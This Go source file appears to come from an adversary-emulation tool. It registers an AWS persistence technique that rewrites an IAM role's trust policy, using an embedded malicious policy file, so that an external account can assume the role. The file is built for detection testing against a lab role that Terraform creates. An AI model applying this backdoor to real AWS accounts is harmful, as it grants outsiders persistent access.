package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/internal/registrations"
	"github.com/datadog/stratus-red-team/pkg/attacktechnique"
	"log"
)

//go:embed main.tf
var tf []byte

//go:embed malicious_policy.json
var maliciousIamPolicy string

func init() {
	registrations.RegisterAttackTechnique(attacktechnique.AttackTechnique{
		Name:                       "aws.persistence.backdoor-iam-role",
		Platform:                   "aws",
		PrerequisitesTerraformCode: tf,
		Detonate: func(terraformOutputs map[string]string) error {
			iamClient := iam.NewFromConfig(providers.GetAWSProvider())
			log.Println("Backdooring IAM role by allowing sts:AssumeRole from an extenral AWS account")
			_, err := iamClient.UpdateAssumeRolePolicy(context.Background(), &iam.UpdateAssumeRolePolicyInput{
				RoleName:       aws.String("sample-legit-role"),
				PolicyDocument: aws.String(maliciousIamPolicy),
			})
			if err != nil {
				return errors.New("unable to backdoor IAM role: " + err.Error())
			}
			return nil
		},
	})
}
